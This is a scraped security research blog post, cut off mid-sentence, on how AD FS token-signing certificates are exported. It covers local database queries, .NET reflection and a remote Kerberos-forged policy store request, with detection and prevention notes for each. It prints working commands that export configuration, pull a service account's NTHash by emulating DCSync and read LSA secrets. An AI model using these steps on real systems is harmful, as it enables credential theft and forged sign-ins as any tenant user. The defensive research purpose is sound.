["https://o365blog.com/post/adfs"]
title = "Exporting AD FS certificates revisited: Tactics, Techniques and Procedures"
description = "Dr Syynimaa works as Principal Identity Security Researcher at Microsoft Security Research.  Before his security researcher career, Dr Syynimaa worked as a CIO, consultant, trainer, and university lecturer for over 20 years. He is a regular speaker in scientific and professional conferences related to Microsoft 365 and Entra ID (Azure AD) security. Before joining Microsoft, Dr Syynimaa was Microsoft MVP in security category and Microsoft Most Valuable Security Researcher (MVR)."
full_description = 'Exporting AD FS certificates revisited: Tactics, Techniques and Procedures April 27, 2021 (Last Modified: September 09, 2022) blog Introduction Exporting configuration Local Access config database Detecting access to config database Preventing access to config database .NET reflection Detecting and preventing .NET reflection Remote as AD FS service account Detecting Preventing Remote as any user Detecting Preventing Editing Policy Store Rules Detecting Preventing Exporting configuration encryption key Local (.NET reflection) Detecting Preventing Remote Detecting Preventing Exporting AD FS certificates Exploiting Summary References I’ve talked about AD FS issues for a couple years now, and finally, after the Solorigate/Sunburst, the world is finally listening 😉 In this blog, I’ll explain the currently known TTPs to exploit AD FS certificates, and introduce a totally new technique to export the configuration data remotely. Introduction I faced the first issues with the Office 365 / Azure AD identity federation in 2017, when I found out that you could login in as any user of the tenant, regardless were they federated or not. The requirement was that the immutableId property of the user was known. The property would be populated automatically for all synced user, for non-synced user this is possible to set manually by admins. I also knew that it was possible to create SAML tokens to exploit this, as long I would have access token signing certificate. I also knew that the certificate was stored in the configuration database and encrypted with a key that was stored in AD. Regardless of the hours spent trying to solve the mystery, I just couldn’t decrypt the certificate. But then came the TROOPERS19, and the wonderful presentation I am AD FS and So Can You by Douglas Bienstock (@doughsec) and Austin Baker (@BakedSec). Their seminal research finally revealed how to decrypt AD FS certificates! The two famous tools were also introduced: ADFSDump and ADFSpoof. For short, to export AD FS token signing certificate, two things are needed: AD FS configuration data and certificate encryption key. At late 2020, the world finally woke up after an attack against SolarWinds. The attack is better known as Solorigate or Sunburst, and among other things, it exploited the known AD FS issues to get access to SolarWinds’ customers Microsoft clouds. Since then, many providers (including Microsoft) have published a loads of material on how to detect such attacks and how to mitigate allready compromised environments. In this blog, I’ll deep-dive in to TTPs these attacks used, how to detect them, and how to protect from future attacks (where applicable). AD FS certification export supports now all methods included in the AD FS attack graph I presented at TROOPERS conference in June 2022 (presentation slide deck available here). Exporting configuration Regardless of the deployment model, AD FS configuration is always stored to a database. For smaller environments, the Windows Internal Database (WID) is used, and Microsoft SQL for larger ones. The actual configuration is an xml file, including all the settings of the AD FS service. The xml file has over 1000 lines, below is an exerpt with the interesting data. 1<ServiceSettingsData xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2012/04/ADFS"> 2 <SecurityTokenService> 3 <AdditionalEncryptionTokens> 4 <CertificateReference> 5 <IsChainIncluded>false</IsChainIncluded> 6 <IsChainIncludedSpecified>false</IsChainIncludedSpecified> 7 <FindValue>B7C09D5C2F434A2B746D200946202DE273A4B68C</FindValue> 8 <RawCertificate>MII[redacted]+RAh7dEypFVmcIyCd</RawCertificate> 9 <EncryptedPfx>AAAAA[redacted]Dbb5/gJLkQ==</EncryptedPfx> 10 <StoreNameValue>My</StoreNameValue> 11 <StoreLocationValue>CurrentUser</StoreLocationValue> 12 <X509FindTypeValue>FindByThumbprint</X509FindTypeValue> 13 </CertificateReference> 14 </AdditionalEncryptionTokens> 15 <AdditionalSigningTokens> 16 <CertificateReference> 17 <IsChainIncluded>false</IsChainIncluded> 18 <IsChainIncludedSpecified>false</IsChainIncludedSpecified> 19 <FindValue>6FFF3A436D13EB299549F2BA93D485CBD050EB4F</FindValue> 20 <RawCertificate>MII[redacted]OzFUGmGWPXqLk</RawCertificate> 21 <EncryptedPfx>AAAAA[redacted]+evM94M17iG9P6VDFrA==</EncryptedPfx> 22 <StoreNameValue>My</StoreNameValue> 23 <StoreLocationValue>CurrentUser</StoreLocationValue> 24 <X509FindTypeValue>FindByThumbprint</X509FindTypeValue> 25 </CertificateReference> 26 </AdditionalSigningTokens> 27 <EncryptionToken> 28 <IsChainIncluded>false</IsChainIncluded> 29 <IsChainIncludedSpecified>false</IsChainIncludedSpecified> 30 <FindValue>B7C09D5C2F434A2B746D200946202DE273A4B68C</FindValue> 31 <RawCertificate>MII[redacted]+RAh7dEypFVmcIyCd</RawCertificate> 32 <EncryptedPfx>AAAAA[redacted]Dbb5/gJLkQ==</EncryptedPfx> 33 <StoreNameValue>My</StoreNameValue> 34 <StoreLocationValue>CurrentUser</StoreLocationValue> 35 <X509FindTypeValue>FindByThumbprint</X509FindTypeValue> 36 </EncryptionToken> 37 <SigningToken> 38 <IsChainIncluded>false</IsChainIncluded> 39 <IsChainIncludedSpecified>false</IsChainIncludedSpecified> 40 <FindValue>6FFF3A436D13EB299549F2BA93D485CBD050EB4F</FindValue> 41 <RawCertificate>MII[redacted]OzFUGmGWPXqLk</RawCertificate> 42 <EncryptedPfx>AAAAA[redacted]+evM94M17iG9P6VDFrA==</EncryptedPfx> 43 <StoreNameValue>My</StoreNameValue> 44 <StoreLocationValue>CurrentUser</StoreLocationValue> 45 <X509FindTypeValue>FindByThumbprint</X509FindTypeValue> 46 </SigningToken> 47 </SecurityTokenService> 48 <PolicyStore> 49 <AuthorizationPolicy>@RuleName = "Permit Service Account" 50exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid", Value == "S-1-5-21-2918793985-2280761178-2512057791-1134"]) 51 =&gt; issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true"); 52 53@RuleName = "Permit Local Administrators" 54exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid", Value == "S-1-5-32-544"]) 55 =&gt; issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true"); 56 57 </AuthorizationPolicy> 58 <AuthorizationPolicyReadOnly>@RuleName = "Permit Service Account" 59exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid", Value == "S-1-5-21-2918793985-2280761178-2512057791-1134"]) 60 =&gt; issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true"); 61 62@RuleName = "Permit Local Administrators" 63exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid", Value == "S-1-5-32-544"]) 64 =&gt; issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true"); 65 66 </AuthorizationPolicyReadOnly> 67 <DkmSettings> 68 <Group>87f0e958-be86-4c39-b469-ac94b5924bd2</Group> 69 <ContainerName>CN=ADFS</ContainerName> 70 <ParentContainerDn>CN=Microsoft,CN=Program Data,DC=aadinternals,DC=com</ParentContainerDn> 71 <PreferredReplica i:nil="true" /> 72 <Enabled>true</Enabled> 73 </DkmSettings> 74 </PolicyStore> 75</ServiceSettingsData> Local Access config database This scenario requires a local admin rights to AD FS server, and that WID is used to store configuration data. In this scenario, there is one Primary AD FS node, and one or more Secondary AD FS nodes. All the management must be done in the primary node, from where all the secondary nodes will fetch the configuration once in five minutes: The configuration can be exported from any AD FS server of the farm, regardless are they primary or secondary nodes. Technically, the export is performed by executing a SQL query against the WID: The database connection string can be queried using WMI: (Get-WmiObject -Namespace root/AD FS -Class SecurityTokenService).ConfigurationDatabaseConnectionString For Windows Server 2019 AD FS the connection string is: Data Source=np:\\.\pipe\microsoft##wid\tsql\query;Initial Catalog=ADFSConfigurationV4;Integrated Security=True The actual configuration data can now be fetched with the following SQL query: SELECT ServiceSettingsData from IdentityServerPolicy.ServiceSettings To export the configuration with AADInternals: # Export configuration and store to variable $ADFSConfig = Export-AADIntADFSConfiguration -Local Or, to save it to a file: # Export configuration to file Export-AADIntAD SConfiguration | Set-Content ADFSConfig.xml -Encoding UTF8 Another technique requiring access to AD FS server would be to download the configuration database from a remote computer same way as Dirk-Jan Mollena (@_dirkjan) does with his adconnectdump tool. However, AFAIK, this has not implemented yet. Detecting access to config database Exploiting this scenario requires logging in to AD FS server. As such, the exploitation can be detected by: Monitoring the Security log for the suspicious logons Enabling audit logging in WID for ServiceSettings queries and monitoring for suspicious access To enable AD FS audit logging, connect to WID database by SQL Management Studio or sqlcmd using database information from connection string above: sqlcmd -S \\.\pipe\microsoft##wid\tsql\query The following SQL query will enable logging for all SELECT statements against ServiceSettings table. The server level auditing created in row 3 is attached to Application Log and enabled in row 5. In row 7, use the correct database name from the connection string above (depends on the AD FS version). The database level auditing is defined in row 9 to include all SELECT statements against ServiceSettings table, and enabled in row 11. USE [master] GO CREATE SERVER AUDIT [ADFS_AUDIT_APPLICATION_LOG] TO APPLICATION_LOG WITH (QUEUE_DELAY = 1000, ON_FAILURE = CONTINUE) GO ALTER SERVER AUDIT [ADFS_AUDIT_APPLICATION_LOG] WITH (STATE = ON) GO USE [ADFSConfigurationV4] GO CREATE DATABASE AUDIT SPECIFICATION [ADFS_SETTINGS_ACCESS_AUDIT] FOR SERVER AUDIT [ADFS_AUDIT_APPLICATION_LOG] ADD (SELECT ON OBJECT::[IdentityServerPolicy].[ServiceSettings] BY [public]) GO ALTER DATABASE AUDIT SPECIFICATION [ADFS_SETTINGS_ACCESS_AUDIT] WITH (STATE = ON) GO As a result, all queries for ServiceSettings are now logged to Application log with event id 33205. If the server_principal_name is not the AD FS service user, the alert should be raised. The server level auditing will generate some extra log events, but database level audit should only include the local exports. Preventing access to config database Dumping databases locally can not be fully prevented, but the limiting access to a minimum would reduce the attack surface. .NET reflection This technique also requires a local admin rights to AD FS server. Basic idea is to run a legit Get‑AdfsProperties command and get the configuration using .NET reflection. This technique was introduced in Microsoft’s ADFSToolbox. ADFSToolbox contains tools “for helping you manage your AD FS farm”. The source code of Test.ServiceAccount.ps1 file shows the following: 199# Gets internal ADFS settings by extracting them Get-AdfsProperties 200function Get-AdfsInternalSettings() 201{ 202 $settings = Get-AdfsProperties 203 $settingsType = $settings.GetType() 204 $propInfo = $settingsType.GetProperty("ServiceSettingsData", [System.Reflection.BindingFlags]::Instance -bor [System.Reflection.BindingFlags]::NonPublic) 205 $internalSettings = $propInfo.GetValue($settings, $null) 206 207 return $internalSettings 208} Detecting and preventing .NET reflection As this technique is using legit AD FS management cmdlet, it practically can’t be detected or prevented, but the limiting access to a minimum would reduce the attack surface. Remote as AD FS service account Dumping the configuration remotely is a totally new functionality in AADInternals and it required a lot of refactoring of Kerberos related functionality :sweat_smile: The idea for this was given by my colleague Ryan Cobb from Secureworks a couple of weeks ago. After tweeting about this new finding, it turned out that, coincidentally, @doughsec had also researched the same technique a couple of months earlier. The report by @doughsec is available here, I’ll post a detailed blog about my research process later. The basic idea here is to emulate the AD FS synchronisation by pretending to be the AD FS service: It turned out that the “AD FS sync” is using SOAP for getting settings. The interesting part is that the whole process takes place using http (not https) and can therefore be monitored by using a proxy like Fiddler or Burp. However, the content of the SOAP messages are encrypted. I’ll not dive into details in this blog, but the process involves Kerberos authentication and exchanging a bunch of encryption keys. I had earlier implemented functionality to create Kerberos tokens to exploit Seamless SSO. To get it to work with AD FS, I had to do some modifications, but that is also another story 😉 Getting the configuration remotely requires a couple of things: Ip address or FQDN of any AD FS server NTHash of the AD FS service user SID of the AD FS service user With the NTHash and SID, we can craft a Kerberos token and use it to authenticate against AD FS. After the authentication is completed, we can send an (encrypted) SOAP message to: http://<server>/ADFS/services/policystoretransfer The SOAP message would contain the following payload: <GetState xmlns="http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore"> <serviceObjectType>ServiceSettings</serviceObjectType> <mask xmlns:i="http://www.w3.org/2001/XMLSchema-instance" i:nil="true"/> <filter xmlns:i="http://www.w3.org/2001/XMLSchema-instance" i:nil="true"/> <clientVersionNumber>1</clientVersionNumber> </GetState> Getting the AD FS service user’s NTHash would usually require tools like Mimikatz or DSInternals. To make it easier for AADInternals users, I’ve included a slighty modified DSInternals.Replication functionality which allows getting user information directly from Domain Controllers by emulating DCSync. First, we need to get the object guid of the AD FS service user. Below I’m using sv_ADFS but that depends on your configuration. Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq sv_ADFS | Format-List Name,ObjectGuid,ObjectSid Name : sv_ADFS ObjectGuid : b6366885-73f0-4239-9cd9-4f44a0a7bc79 ObjectSid : S-1-5-21-1332519571-494820645-211741994-8710 Next, we can query the NTHash of the AD FS service user, which requires credentials having replication permissions. # Save credentials to a variable $cred = Get-Credential # Get the NTHash as hex string Get-AADIntADUserNTHash -ObjectGuid "b6366885-73f0-4239-9cd9-4f44a0a7bc79" -Credentials $creds -Server dc.company.com -AsHex 6e36047d34057fbb8a4e0ce8933c73cf Another option to get NTHash is to get AD FS service account’s password from AD FS server (requires local admin rights): # Get NTHash of the AD FS service account Get-AADIntLSASecrets -AccountName sv_ADFS | Select-Object -ExpandProperty MD4Txt 6e36047d34057fbb8a4e0ce8933c73cf Finally, as'
